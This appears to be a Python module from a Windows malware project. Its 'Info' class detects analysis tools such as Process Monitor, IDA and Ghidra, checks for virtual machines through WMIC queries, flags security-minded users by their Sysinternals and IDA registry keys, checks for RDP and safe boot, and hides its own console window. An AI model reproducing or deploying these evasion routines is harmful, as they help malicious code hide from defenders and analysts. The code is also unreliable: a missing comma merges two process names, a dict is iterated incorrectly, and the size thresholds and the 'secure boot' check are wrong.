import os
import platform
import winreg
from ctypes import windll, WinDLL
from os import environ
from typing import NoReturn
import psutil
import requests

from actions import getRegistryKey, run_pwsh

debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']


class Info:
    def __init__(self):
        self.cpu_count: int = 0
        self.ram_count: int = 0
        self.disk_space: int = 0

    @property
    def is_online(self) -> bool:
        """check if we can access google.com. """
        try:
            x = requests.get('https://google.com', verify=False)
            return True
        except Exception as e:
            return False

    @property
    def is_os_64bit(self) -> bool:
        """
        returns True if os is 64bit, False if 32bit
        """
        return platform.machine().endswith('64')

    @property
    def is_msvc_exist(self) -> bool:
        """
        this function check in the registry if we have visual studio installed.
        we return True if we find something. false if else.
        //TODO 18: find better ways to do this
        """
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Wow6432Node\Microsoft\VisualStudio", 0)
            return True
        except Exception as e:
            return False

    @property
    def is_gcc_in_path(self) -> bool:
        paths = environ['path'].split(';')
        for path in paths:
            if 'mingw64' in path.lower():
                return True
        return False

    @property
    def is_admin(self) -> bool:
        """Returns true if user is admin."""
        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            is_admin = windll.shell32.IsUserAnAdmin() != 0
        return is_admin

    @property
    def keyboard_language(self) -> str:
        """
        Gets the keyboard language in use by the current
        active window process.
        """

        user32 = WinDLL('user32', use_last_error=True)

        # Get the current active window handle
        handle = user32.GetForegroundWindow()

        # Get the thread id from that window handle
        threadid = user32.GetWindowThreadProcessId(handle, 0)

        # Get the keyboard layout id from the threadid
        layout_id = user32.GetKeyboardLayout(threadid)

        # Extract the keyboard language id from the keyboard layout id
        language_id = layout_id & (2 ** 16 - 1)

        # Convert the keyboard language id from decimal to hexadecimal
        language_id_hex = hex(language_id)

        # Check if the hex value is in the dictionary.
        return str(language_id_hex)

    @property
    def is_inside_rdp(self) -> bool:
        return environ.get('SESSIONNAME') and 'RDP' in environ.get('SESSIONNAME')

    @property
    def is_power_user(self) -> bool:
        indicators = {r"SOFTWARE\Sysinternals\AutoRuns": "submitvirustotal",
                      r"SOFTWARE\Sysinternals\ProcessExplorer": "VirusTotalCheck",
                      r"SOFTWARE\Hex-Rays\IDA": "RegistryVersion",
                      }
        for indicator_reg_path, indicator_reg_key in indicators:
            if getRegistryKey(key_name=indicator_reg_key, registry_path=indicator_reg_path):
                return True
        return False

    @property
    def is_secure_boot(self) -> bool:
        """Check's if we are inside secure boot environment"""
        reg_path = r'SYSTEM\CurrentControlSet\Control\SafeBoot\Option'
        key_name = 'OptionValue'
        return bool(getRegistryKey(key_name=key_name, registry_path=reg_path, HKLM=True))

    def hide_current_window(self) -> NoReturn:
        windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), 0)

    def show_current_window(self) -> NoReturn:
        windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), 1)

    def is_enough_cores(self, cores=4) -> bool:
        self.cpu_count = psutil.cpu_count()
        return self.cpu_count > cores

    def is_enough_ram(self, ram=4) -> bool:
        self.ram_count = round(psutil.virtual_memory().total / 1000)
        return self.ram_count > ram

    def is_enough_disk_space(self, disk_space=100) -> bool:
        self.disk_space = round(psutil.disk_usage("C:\\").total / 1000)
        return self.disk_space > disk_space

    def is_someone_watching_us(self):
        return any(
            debug_proc in process.name().lower() or process.name().lower() in debug_proc for debug_proc in debug_process
            for
            process in psutil.process_iter())

    def wmi_is_inside_vm(self) -> bool:
        commands = {'WMIC BIOS GET SERIALNUMBER': [],
                    'WMIC COMPUTERSYSTEM GET MODEL': ['HVM domU', 'Virtual Machine', 'VirtualBox', 'KVM',
                                                      'VMware Virtual Platform'],
                    'WMIC COMPUTERSYSTEM GET MANUFACTURER': ['innotek GmbH', 'VMware, Inc.', 'Microsoft Corporation',
                                                             'Xen',
                                                             'Red Hat']}
        an = "Get-WmiObject Win32_PortConnector"
        q = run_pwsh(an)
        if 'tag' in q.lower():
            return True
        for k, v in commands.items():
            j = run_pwsh(k)
            for output in v:
                if output in j:
                    return True
        return False
